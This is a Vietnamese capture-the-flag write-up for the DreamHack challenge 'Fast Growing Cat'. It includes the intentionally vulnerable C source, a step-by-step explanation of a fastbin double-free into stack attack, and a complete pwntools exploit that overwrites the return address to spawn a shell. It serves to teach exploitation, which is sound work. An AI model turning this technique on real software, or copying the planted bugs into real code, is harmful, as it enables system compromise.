# Fast-Growing-Cat---Write-up-----DreamHack
Hướng dẫn cách giải bài Fast Growing Cat cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 21/6/2026

## 1. Mục tiêu cần làm
Bài này nó là sự pha trộn giữa heap và stack nên các lớp phòng thủ nó không có đầy đủ như các bài heap bình thường.

<img width="362" height="217" alt="image" src="https://github.com/user-attachments/assets/d9bdf09a-6c16-43bd-ad51-8febcda836d4" />

Cái quan trọng các bạn cần để ý là **No Canary**. Bài này sử dụng 1 kĩ thuật tên là **Fastbin Dup Into Stack**. Các bạn có thể đọc thêm tại `How2heap` để hiểu rõ về cơ chế này nha. 

```C
    // Name: fast-growing-cat.c
// Compile: gcc -Wall -fno-stack-protector -no-pie fast-growing-cat.c -o fast-growing-cat
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

struct cat_food_t {
    char name[48];
    uint8_t weight;
    uint32_t price;
};

struct cat_food_t *cat_foods[3];

void win() {
    execve("/bin/sh", 0, 0);
}

void print_cat() {
    puts("\n" \
         " /\\_/\\   meow~\n" \
         "( o.o )\n" \
         " > ^ <\n");
}

void cook_cat_food() {
    int idx;
    struct cat_food_t *cat_food;

    cat_food = calloc(1, sizeof(struct cat_food_t));
    if (cat_food == NULL)
        exit(1);

    printf("\nname of cat food? ");
    scanf("%47s", cat_food->name);

    puts("\nevaluating the name...");
    usleep(0.4 * 1000 * 1000);

    switch (rand() % 3) {
    case 0:  // great
        puts("great cat food name :o");
        cat_food->weight = rand() % 256;
        cat_food->price = rand() % 0x100000000;
        break;
    case 1:  // good
        puts("good cat food name :)");
        cat_food->weight = rand() % 30;
        cat_food->price = rand() % 0x10000;
        break;
    default:  // not bad
        puts("not bad cat food name.");
        cat_food->weight = rand() % 4;
        cat_food->price = rand() % 0x1000;
    }

    printf("\nwhich inventory do you want to put it in? ");
    scanf("%d", &idx);

    if (0 <= idx && idx <= 2)
        cat_foods[idx] = cat_food;
}

void feed_cat() {
    int idx;

    printf("\nwhich cat food do you want to feed? ");
    scanf("%d", &idx);

    if (idx < 0 && 2 < idx)
        exit(1);

    if (!cat_foods[idx])
        exit(1);

    free(cat_foods[idx]);

    puts("\n" \
         " /\\_/\\   yummy~ yummy~\n" \
         "( o.o )\n" \
         " > ^ <\n");
}

void init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);

    srand(time(NULL));
}

void read_str(char *buf, size_t size) {
    size_t readn;

    readn = read(0, buf, size);
    if (readn > 0 && buf[readn - 1] == '\n')
        buf[readn - 1] = '\0';
}

void start() {
    char cmd[32];

    init();

    while (1) {
        print_cat();
        memset(cmd, 0x00, 32);

        while (1) {
            printf("meow? ");
            read_str(cmd, 32);
            printf("%s~\n", cmd);        // In ra tất cả đến khi gặp byte null

            if (!strncmp(cmd, "miow", 4)) {
                cook_cat_food();
                break;
            } else if (!strncmp(cmd, "meow", 4)) {
                feed_cat();
                break;
            } else if (!strncmp(cmd, "muow", 4)) {
                return;
            }
        }
    }
}

int main(void) {
    start();

    return 0;
}
```

Kĩ thuật **Fastbin Dup Into Stack** chỉ cần có được 2 yêu cầu. 1 là phải leak được stack và 2 là phải có calloc. Tại sao có calloc mà không phải malloc thì các bạn có thể hỏi AI nha ( tôi bị ngu ). Bài này mình có thể in ra stack thông qua hàm `printf` mình đánh dấu rồi. Chưa kể bài này nó không có kiểm tra xem index tại `cat_food_t` có lấy chưa. Nghĩa là tại 1 vị trí index các bạn có thể tạo vô hạn food.

Nếu các bạn đọc về kĩ thuật **Fastbin Dup Into Stack** rồi thì mình không giải thích quá nhiều tại cái này nó như bài tập chép lại chứ không có thêm bớt gì. Ok bắt tay vô làm thôi.

## 2. Cách thực thi
Đầu tiên mình sẽ in ra stack thông qua thằng `RBP` nha kênh chat.

```Python
p.sendafter(b'meow? ', b'A' * 32)
p.recvuntil(b'A' * 32)

stack_leak = u64(p.recv(6) + b'\0\0')
log.success(f'Stack leak : {hex(stack_leak)}')
```

Tiếp theo mình sẽ tạo 7 food và xóa nó để lấp đầy tcache nha.

```Python
def create(name, idx):
    p.sendlineafter(b"meow? ", b"miow")
    p.sendlineafter(b"name of cat food? ", name)
    p.sendlineafter(b"which inventory do you want to put it in? ", str(idx).encode())

def feed(idx):
    p.sendlineafter(b"meow? ", b"meow")
    p.sendlineafter(b"which cat food do you want to feed? ", str(idx).encode())

for i in range(7):
    create(f"food{i}".encode(), 0)
    feed(0)
```

Sau khi mình lấp đầy tcache rồi thì mình sẽ tạo thêm 3 food nữa. Và điểm đặc biệt của calloc là thay vì lấy 3 food ra từ tcache thì nó sẽ không lấy và khởi tạo riêng. Đồng nghĩa nếu bạn xóa 3 food này thì nó sẽ chui vào fastbin vì tcache đã đầy rồi.

```Python
create(b"AAAA", 0)
create(b"BBBB", 1)
create(b"CCCC", 2)

feed(0)
feed(1)
feed(0)
```

<img width="1278" height="285" alt="image" src="https://github.com/user-attachments/assets/e7d6d21e-a757-4e65-9337-48d4f85dd4d6" />

Giờ thì ta đã có 2 food trỏ vào nhau rồi, mình sẽ tạo 1 food chứa địa chỉ stack và rút nó ra để có khi rút cái cuối nó sẽ nhảy vào stack.

```Python
create(p64(stack_leak - 0x20), 0)
create(b'pad', 1)
create(b'pad', 1)
```

<img width="1355" height="257" alt="image" src="https://github.com/user-attachments/assets/65102af1-7b6b-490e-a099-7edb203753bf" />

Nhưng trước khi rút food cuối ra thì mình cần phải setup stack trước đã. Calloc nó sẽ lấy địa chỉ trỏ vào + 0x8 kiểm tra xem nó có phù hợp với độ lớn của fastbin hay không. Như trong hình thì fastbin của mình đang là 0x40 thì mình cần setup `stack + 0x8` = 0x40 nó mới cho rút và khởi tạo không thì sẽ bị malloc free ngay.

```Python
p.sendafter(b'meow? ', b'miow' + b'\0'*20 + p64(0x40))
p.sendlineafter(b'name of cat food? ', p64(stack_leak)+ p64(e.symbols['win']))
p.sendlineafter(b'which inventory do you want to put it in? ', str(2).encode())
```

Sau khi setup xong stack thì mình rút ra, mình sẽ được ghi vào vị trí `stack + 0x10`, trùng hợp mình ghi vào `RBP + RIP` nên mình sẽ điền RBP cho đẹp tí và RIP là hàm win, các bạn có thể điền RBP là gì cũng được, mình sẽ điền thử full A.

<img width="761" height="187" alt="image" src="https://github.com/user-attachments/assets/fc0d1b48-84f5-4c43-b72e-53f4b91617a8" />

Giờ chỉ cần nhập `muow` là chương trình tự động thoát và bùm nổ banh shell. Thế thôi bài chỉ có nhiêu đây à, cảm ơn các bạn đã xem hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

## 3. Exploit

```Python
from pwn import *

e = ELF("fast-growing-cat_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

p = process('./fast-growing-cat_patched')
#p = remote('host3.dreamhack.games', 14303)

def create(name, idx):
    p.sendlineafter(b"meow? ", b"miow")
    p.sendlineafter(b"name of cat food? ", name)
    p.sendlineafter(b"which inventory do you want to put it in? ", str(idx).encode())

def feed(idx):
    p.sendlineafter(b"meow? ", b"meow")
    p.sendlineafter(b"which cat food do you want to feed? ", str(idx).encode())

p.sendafter(b'meow? ', b'A' * 32)
p.recvuntil(b'A' * 32)

stack_leak = u64(p.recv(6) + b'\0\0')
log.success(f'Stack leak : {hex(stack_leak)}')

for i in range(7):
    create(f"food{i}".encode(), 0)
    feed(0)

create(b"AAAA", 0)
create(b"BBBB", 1)
create(b"CCCC", 2)

feed(0)
feed(1)
feed(0)

create(p64(stack_leak - 0x20), 0)
create(b'pad', 1)
create(b'pad', 1)

p.sendafter(b'meow? ', b'miow' + b'\0'*20 + p64(0x40))
p.sendlineafter(b'name of cat food? ', p64(stack_leak)+ p64(e.symbols['win']))
p.sendlineafter(b'which inventory do you want to put it in? ', str(2).encode())

p.sendlineafter(b'meow? ', b'muow')

p.interactive()
```


## 4. Tâm sự
Các bạn thấy dạo gần đây mình không ra write-up, thật ra có 3 lí do lận. 1 là mình nghỉ hè rồi nên mình tranh thủ đi làm kiếm tí xiền để cược vô World Cup 2026 🐧. 2 là dạo gần đây mình cảm thấy khá là bị burn out, cũng đã gần 1 năm kể từ khi mình bắt đầu học pwn rồi. Khi mình tham gia các giải CTF thì mình cảm thấy trình độ mình cũng chưa đến đâu cả. Mình đã luyện các nhiều bài nhưng chủ yếu các bài đó chỉ xài đi xài lại vài kĩ thuật mình đã viết rồi nên mình lười không viết write up. Tiếp theo là mình cũng đang tìm hiểu thêm về mảng rev, mình đã giải thử vài bài trên dreamhack và cảm thấy nó cũng thú vị. Có lẽ sau này sẽ có thêm vài bài write up về rev trong tương lai ( hãy cùng phân tích 2 từ có lẽ ). 3 là 6.

Hết rồi mình chỉ tâm sự nhiêu đây thôi, dù sao thì cảm ơn mọi người đã đồng hành cùng mình từ những ngày đầu học pwn. À lí do chính mình viết write up các bài dreamhack và public lên github là do lúc mới học có mấy bài mình không biết giải nên lên mạng tìm mà mấy thằng cha hàn xẻng cứ dém dém bắt nhập pass mới cho coi. Nên mình viết để các bạn giống mình hồi xưa có thể đọc được và biết cách làm ( mẹ AI giờ toàn bị cắm flag cay vcl, không xài được con nào 🥲 ).

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/34ff463a-9dd7-484c-bc05-dd0cf7aa32db" />

Giờ là bảy giờ kém mười rồi.
